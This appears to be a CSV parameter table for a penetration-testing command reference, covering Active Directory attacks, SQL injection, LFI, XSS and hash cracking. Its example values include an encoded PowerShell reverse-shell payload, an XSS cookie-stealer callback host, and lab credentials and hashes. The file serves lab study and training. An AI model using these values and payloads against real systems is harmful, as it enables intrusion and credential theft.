"command_id","variable_id","position","example","required"
"rbcd-set-msds","2d2eb0ae138cccf4","1","DC01","True"
"rbcd-set-msds","13953c1091c80795","2","corp.local","True"
"rbcd-set-msds","d96fe655f106be0f","3","user","True"
"rbcd-set-msds","3c5dfc5cec43fca4","4","","True"
"rbcd-get-st","71ea890e569ad60c","0","dc01.corp.local","True"
"rbcd-get-st","7d06dbae0eb27714","1","administrator","True"
"rbcd-get-st","13953c1091c80795","2","corp.local","True"
"rbcd-get-st","cad7f08aaae84189","3","YOURPC","True"
"rbcd-get-st","715a1e029c62ba8c","4","","True"
"rubeus-s4u-impersonate","cad7f08aaae84189","0","YOURPC","True"
"rubeus-s4u-impersonate","715a1e029c62ba8c","1","","True"
"rubeus-s4u-impersonate","7d06dbae0eb27714","2","administrator","True"
"rubeus-s4u-impersonate","71ea890e569ad60c","3","dc01.corp.local","True"
"impacket-get-st-constrained","d6762778c98c5dd7","0","cifs/dc01.corp.local","True"
"impacket-get-st-constrained","7d06dbae0eb27714","1","administrator","True"
"impacket-get-st-constrained","13953c1091c80795","2","corp.local","True"
"impacket-get-st-constrained","71f7ac2d6b9b69dd","3","svc_sql","True"
"impacket-get-st-constrained","715a1e029c62ba8c","4","","True"
"rubeus-monitor","7d06dbae0eb27714","0","DC01$","False"
"addcomputer-create","b9eed3f78b7cd737","0","YOURPC","True"
"addcomputer-create","3c5dfc5cec43fca4","1","Password123!","True"
"addcomputer-create","728043f16ef5d8d0","2","192.168.50.70","True"
"addcomputer-create","13953c1091c80795","3","corp.local","True"
"addcomputer-create","d96fe655f106be0f","4","user","True"
"bloodyad-rbcd","13953c1091c80795","0","corp.local","True"
"bloodyad-rbcd","d96fe655f106be0f","1","user","True"
"bloodyad-rbcd","3c5dfc5cec43fca4","2","","True"
"bloodyad-rbcd","728043f16ef5d8d0","3","192.168.50.70","True"
"bloodyad-rbcd","2d2eb0ae138cccf4","4","DC01","True"
"bloodyad-rbcd","29645e52585deeaa","5","S-1-5-21-...","True"
"crackmapexec-validate-admin","face8a1865a28492","0","192.168.50.75","True"
"crackmapexec-validate-admin","d96fe655f106be0f","1","dave","True"
"crackmapexec-validate-admin","3c5dfc5cec43fca4","2","Flowers1","True"
"crackmapexec-validate-admin","13953c1091c80795","3","corp.com","True"
"kerbrute-validate-creds","13953c1091c80795","0","corp.com","True"
"kerbrute-validate-creds","728043f16ef5d8d0","1","192.168.50.70","True"
"kerbrute-validate-creds","3c03a0d0af367d1a","2","single_user.txt","True"
"kerbrute-validate-creds","3c5dfc5cec43fca4","3","Nexus123!","True"
"cme-smb-auth-test","face8a1865a28492","0","192.168.50.70","True"
"cme-smb-auth-test","8bf07c964604e256","1","Administrator","True"
"cme-smb-auth-test","11c745735b462353","2","Password123!","True"
"impacket-getuserspns-kerberoast","728043f16ef5d8d0","0","192.168.50.70","True"
"impacket-getuserspns-kerberoast","13953c1091c80795","1","corp.com","True"
"impacket-getuserspns-kerberoast","d96fe655f106be0f","2","meg","True"
"impacket-getuserspns-kerberoast","3c5dfc5cec43fca4","3","VimForPowerShell123!","True"
"impacket-getuserspns-list","728043f16ef5d8d0","0","192.168.50.70","True"
"impacket-getuserspns-list","13953c1091c80795","1","corp.com","True"
"impacket-getuserspns-list","d96fe655f106be0f","2","meg","True"
"impacket-getuserspns-list","3c5dfc5cec43fca4","3","VimForPowerShell123!","True"
"rubeus-kerberoast","8fd707ca6b0af2a8","0","C:\Tools\hashes.kerberoast","True"
"rubeus-kerberoast-aes","8fd707ca6b0af2a8","0","C:\Tools\hashes_rc4.kerberoast","True"
"targeted-kerberoast-set","d96fe655f106be0f","0","targetuser","True"
"targeted-kerberoast-set","bb3f1995b166363e","1","fake.corp.com","True"
"targeted-kerberoast-cleanup","d96fe655f106be0f","0","targetuser","True"
"crackmapexec-sam-dump","face8a1865a28492","0","192.168.50.100","True"
"crackmapexec-sam-dump","d96fe655f106be0f","1","administrator","True"
"crackmapexec-sam-dump","3c5dfc5cec43fca4","2","P@ssw0rd!","True"
"ad-dcsync-secretsdump-user","d96fe655f106be0f","0","dave","True"
"ad-dcsync-secretsdump-user","13953c1091c80795","1","corp.com","True"
"ad-dcsync-secretsdump-user","6717f08cae311dd3","2","jeffadmin","True"
"ad-dcsync-secretsdump-user","3c5dfc5cec43fca4","3","BrouhahaTungPerorateBroom2023!","True"
"ad-dcsync-secretsdump-user","728043f16ef5d8d0","4","192.168.50.70","True"
"ad-dcsync-secretsdump-krbtgt","13953c1091c80795","0","corp.com","True"
"ad-dcsync-secretsdump-krbtgt","6717f08cae311dd3","1","jeffadmin","True"
"ad-dcsync-secretsdump-krbtgt","3c5dfc5cec43fca4","2","BrouhahaTungPerorateBroom2023!","True"
"ad-dcsync-secretsdump-krbtgt","728043f16ef5d8d0","3","192.168.50.70","True"
"ad-dcsync-secretsdump-all","13953c1091c80795","0","corp.com","True"
"ad-dcsync-secretsdump-all","6717f08cae311dd3","1","jeffadmin","True"
"ad-dcsync-secretsdump-all","3c5dfc5cec43fca4","2","BrouhahaTungPerorateBroom2023!","True"
"ad-dcsync-secretsdump-all","728043f16ef5d8d0","3","192.168.50.70","True"
"enum4linux-policy","face8a1865a28492","0","192.168.50.70","True"
"crackmapexec-policy","face8a1865a28492","0","192.168.50.70","True"
"crackmapexec-policy","d96fe655f106be0f","1","guest","True"
"crackmapexec-policy","3c5dfc5cec43fca4","2","''","True"
"ldapsearch-policy","face8a1865a28492","0","192.168.50.70","True"
"ldapsearch-policy","8bddd0c5c3bdc913","1","DC=corp,DC=com","True"
"ad-silver-ticket-mimikatz-create","e3d40d4f13e97802","0","corp.com","True"
"ad-silver-ticket-mimikatz-create","b9d8220c26c0d2a1","1","S-1-5-21-1987370270-658905905-1781884369","True"
"ad-silver-ticket-mimikatz-create","9cd8cdb2db3ccd98","2","web04.corp.com","True"
"ad-silver-ticket-mimikatz-create","cd7a4bc47115ee7e","3","http","True"
"ad-silver-ticket-mimikatz-create","427cedcd8f29e4f2","4","4d28cf5252d39971419580a51484ca09","True"
"ad-silver-ticket-mimikatz-create","ba8c48fad577c937","5","jeffadmin","True"
"ad-silver-ticket-rubeus-create","e3d40d4f13e97802","0","corp.com","True"
"ad-silver-ticket-rubeus-create","b9d8220c26c0d2a1","1","S-1-5-21-1987370270-658905905-1781884369","True"
"ad-silver-ticket-rubeus-create","9cd8cdb2db3ccd98","2","web04.corp.com","True"
"ad-silver-ticket-rubeus-create","cd7a4bc47115ee7e","3","http","True"
"ad-silver-ticket-rubeus-create","427cedcd8f29e4f2","4","4d28cf5252d39971419580a51484ca09","True"
"ad-silver-ticket-rubeus-create","ba8c48fad577c937","5","jeffadmin","True"
"ad-enumerate-spn-target","c83ebffd70acca4c","0","web04","True"
"ad-silver-ticket-validate-access","c83ebffd70acca4c","0","web04.corp.com","True"
"ad-pass-the-hash-crackmapexec","f30b0d533dc79611","0","192.168.50.0/24","True"
"ad-pass-the-hash-crackmapexec","d96fe655f106be0f","1","dave","True"
"ad-pass-the-hash-crackmapexec","715a1e029c62ba8c","2","08d7a47a6f9f66b97b1bae4178747494","True"
"ad-pass-the-hash-crackmapexec","13953c1091c80795","3","corp.com","True"
"ad-pass-the-hash-impacket-psexec","715a1e029c62ba8c","0","08d7a47a6f9f66b97b1bae4178747494","True"
"ad-pass-the-hash-impacket-psexec","13953c1091c80795","1","corp.com","True"
"ad-pass-the-hash-impacket-psexec","d96fe655f106be0f","2","dave","True"
"ad-pass-the-hash-impacket-psexec","face8a1865a28492","3","192.168.50.75","True"
"ad-pass-the-hash-impacket-wmiexec","715a1e029c62ba8c","0","08d7a47a6f9f66b97b1bae4178747494","True"
"ad-pass-the-hash-impacket-wmiexec","13953c1091c80795","1","corp.com","True"
"ad-pass-the-hash-impacket-wmiexec","d96fe655f106be0f","2","dave","True"
"ad-pass-the-hash-impacket-wmiexec","face8a1865a28492","3","192.168.50.75","True"
"mimikatz-kerberos-ptt","ad908f931774e3ea","0","admin.kirbi","True"
"sharpgpoabuse-add-local-admin","d96fe655f106be0f","0","charlotte","True"
"sharpgpoabuse-add-local-admin","a288a37feb0f4228","1","Default Domain Policy","True"
"icacls-sysvol-check","13953c1091c80795","0","secura.yzx","True"
"xss-cookie-stealer","d868de8a4984cd1f","0","10.10.14.5","True"
"xss-cookie-stealer","f4da422801e90d2e","1","8000","True"
"xss-session-hijack-fetch","d868de8a4984cd1f","0","10.10.14.5","True"
"xss-session-hijack-fetch","f4da422801e90d2e","1","8000","True"
"xss-keylogger","d868de8a4984cd1f","0","10.10.14.5","True"
"xss-keylogger","f4da422801e90d2e","1","8000","True"
"sqli-detection-error","84576cd78cb8dae9","0","http://192.168.45.100/page.php?id=1'","True"
"sqli-column-enum-orderby","84576cd78cb8dae9","0","http://192.168.45.100/page.php?id=1","True"
"sqli-column-enum-orderby","3ccd925833fdbff6","1","20","False"
"sqli-union-select-basic","84576cd78cb8dae9","0","http://192.168.45.100/page.php?id=-1","True"
"sqli-union-select-basic","47b8102605349b0c","1","'test1',NULL,NULL,'test2'","True"
"sqli-union-mysql-info","84576cd78cb8dae9","0","http://192.168.45.100/page.php?id=-1","True"
"sqli-union-mysql-info","577bbe7d9b115470","1","CONCAT(table_schema,':',table_name)","True"
"sqli-union-mysql-info","1ade17d343381397","2","NULL,NULL,NULL","True"
"sqli-union-mysql-info","d605b0b2667a6cc6","3","users","False"
"sqli-union-postgresql-info","84576cd78cb8dae9","0","http://192.168.45.100/page.php?id=-1","True"
"sqli-union-postgresql-info","577bbe7d9b115470","1","table_name||':'||column_name","True"
"sqli-union-postgresql-info","1ade17d343381397","2","NULL,NULL,NULL","True"
"sqli-union-postgresql-info","d605b0b2667a6cc6","3","users","False"
"sqli-union-mssql-info","84576cd78cb8dae9","0","http://192.168.45.100/page.aspx?id=-1","True"
"sqli-union-mssql-info","577bbe7d9b115470","1","name+':'+type_desc","True"
"sqli-union-mssql-info","1ade17d343381397","2","NULL,NULL,NULL","True"
"sqli-union-mssql-info","d605b0b2667a6cc6","3","users","False"
"sqlmap-post-exploitation","84576cd78cb8dae9","0","http://192.168.45.100/page.php?id=1*","True"
"sqlmap-post-exploitation","e570524380ef1c4e","1","-D webapp_db -T users --threads 5","False"
"wpscan-enumerate-all","84576cd78cb8dae9","0","http://192.168.45.100/wordpress","True"
"wpscan-enumerate-all","22f11c3a754727db","1","YOUR_API_TOKEN_HERE","False"
"wpscan-aggressive-detection","84576cd78cb8dae9","0","http://192.168.45.100/wordpress","True"
"wpscan-aggressive-detection","22f11c3a754727db","1","YOUR_API_TOKEN_HERE","False"
"wpscan-password-attack","84576cd78cb8dae9","0","http://192.168.45.100/wordpress","True"
"wpscan-password-attack","c75ff8ae0ca187fe","1","admin,john,editor","True"
"wpscan-password-attack","26c3a2c445a786bb","2","/usr/share/wordlists/rockyou.txt","True"
"wpscan-password-attack","b27bf83a80994b90","3","20","False"
"wordpress-xmlrpc-enum","84576cd78cb8dae9","0","http://192.168.45.100/wordpress","True"
"wordpress-manual-version","84576cd78cb8dae9","0","http://192.168.45.100/wordpress","True"
"curl-ua-poison-apache","face8a1865a28492","0","192.168.45.100","True"
"curl-ua-poison-apache","f4da422801e90d2e","1","80","False"
"curl-ua-poison-nginx","face8a1865a28492","0","192.168.45.100","True"
"curl-ua-poison-nginx","f4da422801e90d2e","1","80","False"
"lfi-access-log-apache","face8a1865a28492","0","192.168.45.100","True"
"lfi-access-log-apache","f4da422801e90d2e","1","80","False"
"lfi-access-log-apache","232b743e437226b4","2","index.php","True"
"lfi-access-log-apache","977ef033079dfa1b","3","page","True"
"lfi-access-log-nginx","face8a1865a28492","0","192.168.45.100","True"
"lfi-access-log-nginx","f4da422801e90d2e","1","80","False"
"lfi-access-log-nginx","232b743e437226b4","2","index.php","True"
"lfi-access-log-nginx","977ef033079dfa1b","3","file","True"
"ssh-authlog-poison","face8a1865a28492","0","192.168.45.100","True"
"lfi-auth-log","face8a1865a28492","0","192.168.45.100","True"
"lfi-auth-log","f4da422801e90d2e","1","80","False"
"lfi-auth-log","232b743e437226b4","2","page.php","True"
"lfi-auth-log","977ef033079dfa1b","3","file","True"
"lfi-proc-environ","face8a1865a28492","0","192.168.45.100","True"
"lfi-proc-environ","f4da422801e90d2e","1","80","False"
"lfi-proc-environ","232b743e437226b4","2","index.php","True"
"lfi-proc-environ","977ef033079dfa1b","3","page","True"
"lfi-rce-trigger","face8a1865a28492","0","192.168.45.100","True"
"lfi-rce-trigger","f4da422801e90d2e","1","80","False"
"lfi-rce-trigger","232b743e437226b4","2","page.php","True"
"lfi-rce-trigger","977ef033079dfa1b","3","file","True"
"lfi-rce-trigger","8f54a3b95ece8bf7","4","whoami","True"
"gobuster-dir","84576cd78cb8dae9","0","http://192.168.1.100","True"
"gobuster-dir","26c3a2c445a786bb","1","/usr/share/wordlists/dirb/common.txt","True"
"gobuster-dir","b27bf83a80994b90","2","30","False"
"nikto-scan","84576cd78cb8dae9","0","http://192.168.1.100","True"
"nikto-scan","e252e97ce258b597","1","nikto_scan.txt","False"
"sqlmap-basic","84576cd78cb8dae9","0","http://192.168.1.100/page.php","True"
"sqlmap-basic","977ef033079dfa1b","1","id","True"
"sqlmap-basic","fe5d0b97f12990be","2","1","True"
"wfuzz-params","84576cd78cb8dae9","0","http://192.168.1.100/page.php","True"
"wfuzz-params","26c3a2c445a786bb","1","/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt","True"
"curl-post","84576cd78cb8dae9","0","http://192.168.1.100/login.php","True"
"curl-post","977ef033079dfa1b","1","username","True"
"curl-post","fe5d0b97f12990be","2","admin","True"
"whatweb-enum","84576cd78cb8dae9","0","http://192.168.1.100","True"
"web-version-enumeration","face8a1865a28492","0","http://10.10.11.18","True"
"web-access-uploaded-file","face8a1865a28492","0","usage.htb","True"
"web-access-uploaded-file","ead0e27c7126f27d","1","shell.php","True"
"web-access-uploaded-file","8f54a3b95ece8bf7","2","whoami","True"
"webshell-execute-revshell","face8a1865a28492","0","usage.htb","True"
"webshell-execute-revshell","7b37b8d1db7d3089","1","shell.php","True"
"webshell-execute-revshell","771cc56dcaeb12b8","2","10.10.14.5","True"
"webshell-execute-revshell","7ef180ba63d75600","3","9001","True"
"sqlmap-from-request","1571a07e07887e26","0","reset.req","True"
"sqlmap-from-request","024bbc504e825243","1","email","True"
"sqlmap-from-request-level3","1571a07e07887e26","0","reset.req","True"
"sqlmap-from-request-level3","024bbc504e825243","1","email","True"
"sqlmap-enumerate-databases","1571a07e07887e26","0","reset.req","True"
"sqlmap-enumerate-databases","024bbc504e825243","1","email","True"
"sqlmap-enumerate-tables","1571a07e07887e26","0","reset.req","True"
"sqlmap-enumerate-tables","024bbc504e825243","1","email","True"
"sqlmap-enumerate-tables","21e4c16201d50886","2","usage_blog","True"
"sqlmap-dump-table","1571a07e07887e26","0","reset.req","True"
"sqlmap-dump-table","024bbc504e825243","1","email","True"
"sqlmap-dump-table","21e4c16201d50886","2","usage_blog","True"
"sqlmap-dump-table","b270d50f2a10757b","3","admin_users","True"
"curl-wordpress-version-feed","84576cd78cb8dae9","0","http://example.com","True"
"ps-reverse-shell-base64","c8d73f4968103405","0","JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADEAMQA4AC4AMgAiACwANAA0ADMAKQA7AA...","True"
"powerview-get-netuser-filter","d96fe655f106be0f","0","administrator","True"
"powerview-get-netgroup-specific","67f2858408350aef","0","Domain Admins","True"
"powerview-get-netgroupmember","67f2858408350aef","0","Domain Admins","True"
"powerview-get-netsession","face8a1865a28492","0","DC1.corp.com","True"
"powerview-get-netloggedon","face8a1865a28492","0","WEB04.corp.com","True"
"sysinternals-psloggedon","face8a1865a28492","0","FILES04.corp.com","True"
"net-view-shares","face8a1865a28492","0","FILES04.corp.com","True"
"test-share-access","face8a1865a28492","0","FILES04.corp.com","True"
"test-share-access","df84dcd52099d866","1","backup","True"
"search-share-files","94dc7e6af39d933b","0","password","True"
"search-share-files","face8a1865a28492","1","FILES04","True"
"search-share-files","df84dcd52099d866","2","backup","True"
"gpp-password-decrypt","1ecd63afed4d48a3","0","+bsY0V3d4/KgX3VJdO/vyepPfAN1zMFTiQDApgR92JE","True"
"psloggedon","35f69f2b73e7ca5e","0","WS01","True"
"gpp-password-files","13953c1091c80795","0","corp.com","True"
"keepass2john-extract","135ddd653932222e","0","Database.kdbx","True"
"keepass2john-extract","8fd707ca6b0af2a8","1","keepass.hash","True"
"ssh2john-extract","b4592edc8170ae2e","0","id_rsa","True"
"ssh2john-extract","8fd707ca6b0af2a8","1","ssh.hash","True"
"zip2john-extract","ea43829b351f8adb","0","encrypted.zip","True"
"zip2john-extract","8fd707ca6b0af2a8","1","zip.hash","True"
"rar2john-extract","0c63eca326f974c4","0","encrypted.rar","True"
"rar2john-extract","8fd707ca6b0af2a8","1","rar.hash","True"
"office2john-extract","b932ad1fb7c4165a","0","encrypted.docx","True"
"office2john-extract","8fd707ca6b0af2a8","1","office.hash","True"
"hashid","7c6be3a1d837357c","0","5f4dcc3b5aa765d61d8327deb882cf99","True"
"pdf2john-extract","7e34995ddd1a4462","0","encrypted.pdf","True"
"pdf2john-extract","8fd707ca6b0af2a8","1","pdf.hash","True"
"python-hash-generator","3c5dfc5cec43fca4","0","password123","True"
"base64-decode-hash","b5b5bd1aed842a26","0","cGFzc3dvcmQxMjM=","True"
"net-user-domain-detail","d96fe655f106be0f","0","administrator","True"
"net-group-domain-members","67f2858408350aef","0","Domain Admins","True"
"setspn-list-user","d96fe655f106be0f","0","svc_sql","True"
"net-domain-controllers","13953c1091c80795","0","corp.com","True"
"setspn-list-all","13953c1091c80795","0","corp.com","True"
"powerview-get-objectacl","fc6cd970813d4e6d","0","administrator","True"
"powerview-get-objectacl-genericall","fc6cd970813d4e6d","0","Domain Admins","True"
"powerview-convert-sidtoname","98a091087b3837db","0","S-1-5-21-1987370270-658905905-1781884369-1104","True"
"powerview-get-objectacl-writedacl","fc6cd970813d4e6d","0","Domain Admins","True"
"powerview-get-objectacl-forcechangepassword","d96fe655f106be0f","0","administrator","True"
"powerview-get-objectacl-writeowner","fc6cd970813d4e6d","0","Domain Admins","True"
"powerview-find-interestingdomainacl","d96fe655f106be0f","0","stephanie","True"
"powerview-get-pathacl","face8a1865a28492","0","DC1.corp.com","True"
"powerview-get-pathacl","df84dcd52099d866","1","SYSVOL","True"
"powerview-get-objectacl-user","d96fe655f106be0f","0","sqlservice","True"
"powerview-get-objectacl-group","67f2858408350aef","0","Domain Admins","True"
"check-remote-registry-service","face8a1865a28492","0","WS01.corp.com","True"
"enable-remote-registry","face8a1865a28492","0","WORKSTATION05.corp.com","True"
"query-hkey-users-remote","face8a1865a28492","0","FILESERVER01","True"
"john-single-crack","466e566fa12c7f09","0","shadow.txt","True"
"john-wordlist-attack","26c3a2c445a786bb","0","/usr/share/wordlists/rockyou.txt","True"
"john-wordlist-attack","466e566fa12c7f09","1","hashes.txt","True"
"john-rules-attack","26c3a2c445a786bb","0","/usr/share/wordlists/rockyou.txt","True"
"john-rules-attack","0493fda605685467","1","sshRules","True"
"john-rules-attack","466e566fa12c7f09","2","ssh.hash","True"
"john-format-specify","66daf52cbcd37c75","0","raw-md5","True"
"john-format-specify","26c3a2c445a786bb","1","/usr/share/wordlists/rockyou.txt","True"
"john-format-specify","466e566fa12c7f09","2","hashes.txt","True"
"john-show-cracked","466e566fa12c7f09","0","hashes.txt","True"
"john-ssh-key-crack","26c3a2c445a786bb","0","custom_wordlist.txt","True"
"john-ssh-key-crack","0493fda605685467","1","sshRules","True"
"john-ssh-key-crack","3053d48c68df1177","2","ssh.hash","True"
"john-keepass-crack","26c3a2c445a786bb","0","/usr/share/wordlists/rockyou.txt","True"
"john-keepass-crack","0493fda605685467","1","sshRules","True"
"john-keepass-crack","d8c0cfcde9f0c303","2","keepass.hash","True"
"john-incremental-mode","466e566fa12c7f09","0","hashes.txt","True"
"john-list-formats","f4db1a6ce9d2c826","0","ssh","False"
"john-add-custom-rules","6e4b7df9d78fc903","0","custom.rule","True"
"ps-get-group-members-basic","39f9c505660003ca","0","Domain Admins","True"
"ps-nested-group-check-member-type","a0e40210631dd84d","0","CN=Administrator,CN=Users,DC=corp,DC=com","True"
"ps-nested-group-recursive-function","39f9c505660003ca","0","Service Personnel","True"
"powerview-get-domaingroup-recursive","39f9c505660003ca","0","Domain Admins","True"
"ps-powerview-get-user-details","d96fe655f106be0f","0","jeff_admin","True"
"ps-powerview-find-service-accounts","39f9c505660003ca","0","Service Personnel","True"
"ps-extract-flag-from-user","d96fe655f106be0f","0","jeff_admin","True"
"ps-nested-group-one-liner","39f9c505660003ca","0","Service Personnel","True"
"bloodhound-python-all-collection","d96fe655f106be0f","0","pete","True"
"bloodhound-python-all-collection","3c5dfc5cec43fca4","1","Password123!","True"
"bloodhound-python-all-collection","13953c1091c80795","2","corp.com","True"
"bloodhound-python-all-collection","728043f16ef5d8d0","3","192.168.50.70","True"
"bloodhound-python-dconly","d96fe655f106be0f","0","pete","True"
"bloodhound-python-dconly","3c5dfc5cec43fca4","1","Password123!","True"
"bloodhound-python-dconly","13953c1091c80795","2","corp.com","True"
"bloodhound-python-dconly","728043f16ef5d8d0","3","192.168.50.70","True"
"bloodhound-python-pth","d96fe655f106be0f","0","pete","True"
"bloodhound-python-pth","229ff2db91c44918","1","aad3b435b51404eeaad3b435b51404ee","True"
"bloodhound-python-pth","80f235d1e9d465cc","2","a87f3a337d73085c45f9416be5787d86","True"
"bloodhound-python-pth","13953c1091c80795","3","corp.com","True"
"bloodhound-python-pth","728043f16ef5d8d0","4","192.168.50.70","True"
"bloodhound-python-kerberos","13953c1091c80795","0","corp.com","True"
"bloodhound-python-kerberos","728043f16ef5d8d0","1","192.168.50.70","True"
"bloodhound-python-specific-collection","d96fe655f106be0f","0","pete","True"
"bloodhound-python-specific-collection","3c5dfc5cec43fca4","1","Password123!","True"
"bloodhound-python-specific-collection","13953c1091c80795","2","corp.com","True"
"bloodhound-python-specific-collection","728043f16ef5d8d0","3","192.168.50.70","True"
"bloodhound-python-specific-collection","e23f80734810fa0a","4","Group,ACL,ObjectProps","True"
"bloodhound-python-ldaps","d96fe655f106be0f","0","pete","True"
"bloodhound-python-ldaps","3c5dfc5cec43fca4","1","Password123!","True"
"bloodhound-python-ldaps","13953c1091c80795","2","corp.com","True"
"bloodhound-python-ldaps","728043f16ef5d8d0","3","192.168.50.70","True"
"bloodhound-python-computerfile","d96fe655f106be0f","0","pete","True"
"bloodhound-python-computerfile","3c5dfc5cec43fca4","1","Password123!","True"
"bloodhound-python-computerfile","13953c1091c80795","2","corp.com","True"
"bloodhound-python-computerfile","728043f16ef5d8d0","3","192.168.50.70","True"
"bloodhound-python-computerfile","fefad7be6fd08857","4","targets.txt","True"
"bloodhound-python-output-prefix","d96fe655f106be0f","0","pete","True"
"bloodhound-python-output-prefix","3c5dfc5cec43fca4","1","Password123!","True"
"bloodhound-python-output-prefix","13953c1091c80795","2","corp.com","True"
"bloodhound-python-output-prefix","728043f16ef5d8d0","3","192.168.50.70","True"
"bloodhound-python-output-prefix","0f31e14451008fe7","4","corp_exam","True"
"ps-ldap-directorysearcher","4e53a04ec42679e3","0","(objectClass=user)","True"
"wfuzz-z-file","26c3a2c445a786bb","0","/usr/share/seclists/Discovery/Web-Content/common.txt","True"
"wfuzz-z-file","84576cd78cb8dae9","1","http://192.168.45.100/FUZZ","True"
"wfuzz-post-login-brute","26c3a2c445a786bb","0","/usr/share/wordlists/rockyou.txt","True"
"wfuzz-post-login-brute","f2ea34825b9facd9","1","200","True"
"wfuzz-post-login-brute","60886aaed80d3c16","2","username=admin&password=FUZZ","True"
"wfuzz-post-login-brute","84576cd78cb8dae9","3","http://192.168.45.100/wp-login.php","True"
"masscan-full-tcp","face8a1865a28492","0","192.168.45.100","True"
"masscan-full-tcp","52de2110bc5698c7","1","1000","True"
"masscan-full-tcp","cd9fb31db6c8684f","2","tun0","False"
"masscan-full-tcp","06155873aea1c2dd","3","10.10.14.1","False"
"smb-share-windows-list","face8a1865a28492","0","192.168.1.50","True"
"smb-share-windows-list","df84dcd52099d866","1","C$","True"
"gpp-decrypt-python-script","1ecd63afed4d48a3","0","edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ","True"
"hashcat-kerberos-aes256-cbc","466e566fa12c7f09","0","hashes.txt","True"
"hashcat-kerberos-aes256-cbc","26c3a2c445a786bb","1","/usr/share/wordlists/rockyou.txt","True"
"manual-hash-generation-loop","26c3a2c445a786bb","0","wordlist.txt","True"
"calculate-keyspace","76ee96de9fd2e121","0","62","True"
"calculate-keyspace","4f947993030967e5","1","8","True"
"calculate-crack-time","84062566d9af41e0","0","218340105584896","True"
"calculate-crack-time","7708e7113d706d99","1","1000000000","True"
"wordlist-effectiveness","26c3a2c445a786bb","0","/usr/share/wordlists/rockyou.txt","True"
"wordlist-effectiveness","877f528290156ffc","1","14344391","True"
"wordlist-effectiveness","1cbbb26cf87b6e94","2","64","True"
"hash-rate-benchmark","e2e282930b04d4d5","0","1000","True"
"session-management","e2e282930b04d4d5","0","1000","True"
"session-management","466e566fa12c7f09","1","ntlm.txt","True"
"session-management","26c3a2c445a786bb","2","/usr/share/wordlists/rockyou.txt","True"
"session-management","916d230d1637bcca","3","exam-target1","True"
"session-management","8fd707ca6b0af2a8","4","cracked.txt","True"
"monitor-crack-progress","916d230d1637bcca","0","exam-target1","True"
"optimize-crack-performance","e2e282930b04d4d5","0","1000","True"
"optimize-crack-performance","466e566fa12c7f09","1","ntlm.txt","True"
"optimize-crack-performance","26c3a2c445a786bb","2","/usr/share/wordlists/rockyou.txt","True"
"rule-append-digit","6e4b7df9d78fc903","0","append-digit.rule","True"
"rule-prepend-year","6e4b7df9d78fc903","0","prepend-year.rule","True"
"rule-capitalize-append","6e4b7df9d78fc903","0","cap-special.rule","True"
"rule-leet-speak","6e4b7df9d78fc903","0","leet.rule","True"
"rule-duplicate-word","6e4b7df9d78fc903","0","duplicate.rule","True"
"hashcat-test-rules","26c3a2c445a786bb","0","passwords.txt","True"
"hashcat-test-rules","6e4b7df9d78fc903","1","custom.rule","True"
"john-test-rules","26c3a2c445a786bb","0","passwords.txt","True"
"john-test-rules","0493fda605685467","1","KoreLogic","True"
"hashcat-best64-rules","e2e282930b04d4d5","0","0","True"
"hashcat-best64-rules","466e566fa12c7f09","1","hash.txt","True"
"hashcat-best64-rules","26c3a2c445a786bb","2","/usr/share/wordlists/rockyou.txt","True"
"hashcat-rockyou-rules","e2e282930b04d4d5","0","1000","True"
"hashcat-rockyou-rules","466e566fa12c7f09","1","ntlm.txt","True"
"hashcat-rockyou-rules","26c3a2c445a786bb","2","/usr/share/wordlists/rockyou.txt","True"
"hashcat-dive-rules","e2e282930b04d4d5","0","0","True"
"hashcat-dive-rules","466e566fa12c7f09","1","hash.txt","True"
"hashcat-dive-rules","26c3a2c445a786bb","2","/usr/share/wordlists/rockyou.txt","True"
"create-policy-rules","231395bf8b7eef76","0","2024","True"
"create-policy-rules","6e4b7df9d78fc903","1","policy.rule","True"
"hashcat-md5-crack","466e566fa12c7f09","0","md5_hashes.txt","True"
"hashcat-md5-crack","26c3a2c445a786bb","1","/usr/share/wordlists/rockyou.txt","True"
"hashcat-sha256-crack","466e566fa12c7f09","0","sha256_hashes.txt","True"
"hashcat-sha256-crack","26c3a2c445a786bb","1","/usr/share/wordlists/rockyou.txt","True"
